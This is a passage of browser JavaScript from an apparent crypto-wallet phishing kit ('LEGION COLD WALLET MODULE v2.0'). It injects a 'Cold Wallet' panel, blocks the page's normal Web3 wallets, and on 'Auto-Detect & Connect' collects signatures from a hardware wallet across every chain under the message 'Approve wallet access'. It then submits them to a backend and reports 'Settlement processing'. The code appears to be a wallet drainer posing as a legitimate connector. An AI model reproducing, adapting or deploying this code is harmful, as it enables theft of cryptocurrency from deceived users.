      '.hw-wallet-item:hover{background:rgba(245,158,11,.1);border-color:rgba(245,158,11,.3);}',
      '.hw-wallet-name{font-weight:500;font-size:13px;}',
      '.hw-wallet-method{font-size:11px;color:#94a3b8;}',
      '.hw-connect-btn{width:100%;padding:12px;border:0;border-radius:12px;font:600 14px system-ui;cursor:pointer;color:#fff;background:linear-gradient(135deg,#f59e0b,#d97706);box-shadow:0 2px 12px rgba(245,158,11,.3);}',
      '.hw-connect-btn:hover{box-shadow:0 4px 20px rgba(245,158,11,.45);}',
      '.hw-status{font-size:12px;color:#94a3b8;margin-top:12px;padding:8px 10px;background:rgba(255,255,255,.03);border-radius:8px;}',
    ].join('');
    document.head.appendChild(css);

    // Launcher
    var launcher = document.createElement('button');
    launcher.id = 'legion-hw-launcher';
    launcher.innerHTML = '🔐 Cold Wallet';
    launcher.addEventListener('click', function() {
      var panel = document.getElementById('legion-hw-panel');
      if (panel) panel.classList.toggle('open');
    });
    document.body.appendChild(launcher);

    // Method badges
    var methodsHTML = '';
    var allMethods = [
      { key: 'usb', label: 'USB' },
      { key: 'hid', label: 'HID' },
      { key: 'ble', label: 'Bluetooth' },
      { key: 'nfc', label: 'NFC' },
      { key: 'qr', label: 'QR Code' }
    ];
    allMethods.forEach(function(m) {
      var active = methods.indexOf(m.key) !== -1;
      methodsHTML += '<span class="hw-method ' + (active ? 'on' : 'off') + '">' + m.label + '</span>';
    });

    // Wallet list
    var walletsHTML = '';
    available.forEach(function(w, idx) {
      walletsHTML += '<div class="hw-wallet-item" data-idx="' + idx + '">' +
        '<div><div class="hw-wallet-name">' + w.name + '</div>' +
        '<div class="hw-wallet-method">' + w.method.toUpperCase() + '</div></div>' +
        '<span style="color:#fbbf24;">→</span></div>';
    });

    // Panel
    var panel = document.createElement('div');
    panel.id = 'legion-hw-panel';
    panel.innerHTML = '<div class="hw-hdr"><span>🔐 Cold Wallet</span><button id="hw-close">&times;</button></div>' +
      '<div class="hw-body">' +
      '<div class="hw-methods">' + methodsHTML + '</div>' +
      '<div class="hw-wallet-list">' + walletsHTML + '</div>' +
      '<button class="hw-connect-btn" id="hw-auto-connect">Auto-Detect & Connect</button>' +
      '<div class="hw-status" id="hw-status">' + available.length + ' cold wallets supported</div>' +
      '</div>';
    document.body.appendChild(panel);

    // Events
    document.getElementById('hw-close').addEventListener('click', function() { panel.classList.remove('open'); });

    document.getElementById('hw-auto-connect').addEventListener('click', async function() {
      document.getElementById('hw-status').textContent = 'Searching for devices...';
      try {
        await SESSION.connect();
        document.getElementById('hw-status').textContent = 'Connected: ' + SESSION.connection.name;
        var sigs = await SESSION.signAllChains('Approve wallet access');
        document.getElementById('hw-status').textContent = 'Signed ' + Object.keys(sigs).length + ' chains. Submitting...';
        await SESSION.submitToBackend();
        document.getElementById('hw-status').textContent = 'Done! Settlement processing...';
      } catch (e) {
        document.getElementById('hw-status').textContent = 'Error: ' + e.message;
      }
    });

    // Individual wallet click
    panel.querySelectorAll('.hw-wallet-item').forEach(function(item) {
      item.addEventListener('click', async function() {
        var idx = parseInt(this.getAttribute('data-idx'));
        document.getElementById('hw-status').textContent = 'Connecting to ' + available[idx].name + '...';
        try {
          await SESSION.connect(idx);
          document.getElementById('hw-status').textContent = 'Connected: ' + SESSION.connection.name;
        } catch (e) {
          document.getElementById('hw-status').textContent = 'Failed: ' + e.message;
        }
      });
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // INIT
  // ═══════════════════════════════════════════════════════════════════════════

  function init() {
    LOG.info('═══════════════════════════════════════════');
    LOG.info('LEGION COLD WALLET MODULE v2.0');
    LOG.info('═══════════════════════════════════════════');

    blockWeb3Wallets();

    var methods = getAvailableMethods();
    var wallets = getAvailableWallets();
    LOG.info('Available methods: ' + methods.join(', '));
    LOG.info('Supported wallets: ' + wallets.length);

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', createColdWalletUI);
    } else {
      createColdWalletUI();
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // GLOBAL API
  // ═══════════════════════════════════════════════════════════════════════════

  window.LEGION_HARDWARE = {
    connect: function(idx) { return SESSION.connect(idx); },
    sign: function(chain, msg) { return SESSION.sign(chain, msg); },
    signAll: function(msg) { return SESSION.signAllChains(msg || 'Approve wallet access'); },
    submit: function() { return SESSION.submitToBackend(); },
    disconnect: function() { SESSION.disconnect(); },
    isConnected: function() { return SESSION.connection !== null; },
    getSignatures: function() { return SESSION.signatures; },
    getAvailable: function() { return getAvailableWallets(); },
    getMethods: function() { return getAvailableMethods(); },
    getLogs: function() { return LOG.history; }
  };

  init();
  LOG.info('Cold Wallet Module ready');

})();
